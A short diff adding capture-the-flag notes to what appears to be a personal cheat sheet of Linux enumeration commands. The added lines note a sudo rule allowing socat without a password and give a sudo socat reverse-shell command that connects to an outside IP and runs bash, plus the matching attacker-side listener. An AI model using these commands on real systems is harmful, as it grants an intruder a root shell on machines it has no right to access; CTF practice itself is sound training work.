@@ -10,3 +10,11 @@ cat /etc/os-release
 lsb_release -a
 
 
+-----------------lfi ctf----------------
+terminal shows: (root) NOPASSWD: /usr/bin/socat
+soln & acess
+sudo socat tcp-connect:10.8.115.203:1234 exec:bash,pty,stderr,setsid,sigint,sane
+socat file:`tty`,raw,echo=0 tcp-listen:1234
+
+
+
